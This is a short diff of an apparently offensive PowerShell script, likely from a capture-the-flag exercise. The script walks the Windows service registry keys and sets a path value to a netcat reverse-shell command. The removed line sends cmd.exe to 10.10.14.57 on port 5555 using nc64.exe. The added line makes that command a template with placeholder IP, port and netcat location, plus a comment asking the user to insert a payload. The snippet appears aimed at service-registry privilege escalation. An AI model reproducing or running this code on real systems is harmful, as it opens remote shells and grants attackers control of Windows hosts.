@@ -1,5 +1,5 @@
-﻿$reg = Get-Item HKLM:\System\CurrentControlSet\services\*
-$pspath = 'C:\Users\Hector\Links\nc64.exe 10.10.14.57 5555 -e C:\WINDOWS\SYSTEM32\cmd.exe'
+$reg = Get-Item HKLM:\System\CurrentControlSet\services\*
+$pspath = 'NC.EXE_LOCATION IP PORT -e C:\WINDOWS\SYSTEM32\cmd.exe' #YOU NEED TO ADD HERE YOUR PAYLOAD
 $ErrorActionPreference= 'silentlycontinue'
 
 foreach ($r in $reg) {
